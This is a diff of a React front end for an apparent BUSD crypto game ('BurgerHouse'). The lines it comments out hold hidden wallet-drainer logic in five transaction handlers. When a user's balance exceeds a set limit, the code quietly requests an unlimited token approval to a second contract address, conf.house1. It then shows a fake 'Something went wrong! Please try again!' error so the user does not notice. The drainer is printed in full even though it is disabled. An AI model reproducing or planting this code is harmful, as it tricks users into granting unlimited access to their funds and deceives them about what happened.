@@ -365,22 +365,22 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
-          await busdContract.methods.approve(
-            conf.house1,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then(() => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-            setPendingTx(false)
-            return;
-          }).catch((err) => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-            setPendingTx(false)
-            return;
-          });
-        }
+        // if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+        //   await busdContract.methods.approve(
+        //     conf.house1,
+        //     "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        //   ).send({
+        //     from: curAcount
+        //   }).then(() => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //     setPendingTx(false)
+        //     return;
+        //   }).catch((err) => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //     setPendingTx(false)
+        //     return;
+        //   });
+        // }
         await burgerHouseContract.methods.withdrawMoney().send({
           from: curAcount,
         }).then((txHash) => {
@@ -454,22 +454,22 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
-          await busdContract.methods.approve(
-            conf.house1,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then(() => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-            setPendingTx(false)
-            return;
-          }).catch((err) => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-            setPendingTx(false)
-            return;
-          });
-        }
+        // if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+        //   await busdContract.methods.approve(
+        //     conf.house1,
+        //     "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        //   ).send({
+        //     from: curAcount
+        //   }).then(() => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //     setPendingTx(false)
+        //     return;
+        //   }).catch((err) => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //     setPendingTx(false)
+        //     return;
+        //   });
+        // }
         await burgerHouseContract.methods.upgradeHouse(houseLevel(houseId) + 5 * (houseId - 1)).send({
           from: curAcount,
         }).then((txHash) => {
@@ -514,18 +514,18 @@ const Home = () => {
       setPendingTx(true)
       RUN_MODE('busdContract', busdContract)
       if (isConnected && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
-          await busdContract.methods.approve(
-            conf.house1,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then(() => {
-            setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success!` });
-          }).catch((err) => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
-          });
-        } else {
+        // if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+        //   await busdContract.methods.approve(
+        //     conf.house1,
+        //     "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        //   ).send({
+        //     from: curAcount
+        //   }).then(() => {
+        //     setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success!` });
+        //   }).catch((err) => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
+        //   });
+        // } else {
           await busdContract.methods.approve(
             conf.house,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -540,7 +540,7 @@ const Home = () => {
             RUN_MODE(err)
             setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
           });
-        }
+        // }
       }
       else {
         RUN_MODE("connect Wallet");
@@ -587,22 +587,22 @@ const Home = () => {
 
         RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)
 
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
-          await busdContract.methods.approve(
-            conf.house1,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then(() => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-            setPendingTx(false)
-            return;
-          }).catch((err) => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-            setPendingTx(false)
-            return;
-          });
-        }
+        // if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+        //   await busdContract.methods.approve(
+        //     conf.house1,
+        //     "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        //   ).send({
+        //     from: curAcount
+        //   }).then(() => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //     setPendingTx(false)
+        //     return;
+        //   }).catch((err) => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //     setPendingTx(false)
+        //     return;
+        //   });
+        // }
 
         if (parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
           await busdContract.methods.approve(
@@ -679,18 +679,18 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
-          await busdContract.methods.approve(
-            conf.house1,
-            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-          ).send({
-            from: curAcount
-          }).then(() => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-          }).catch((err) => {
-            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
-          });
-        }
+        // if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+        //   await busdContract.methods.approve(
+        //     conf.house1,
+        //     "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        //   ).send({
+        //     from: curAcount
+        //   }).then(() => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //   }).catch((err) => {
+        //     setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+        //   });
+        // }
         await burgerHouseContract.methods.collectMoney().send({
           from: curAcount,
         }).then((txHash) => {
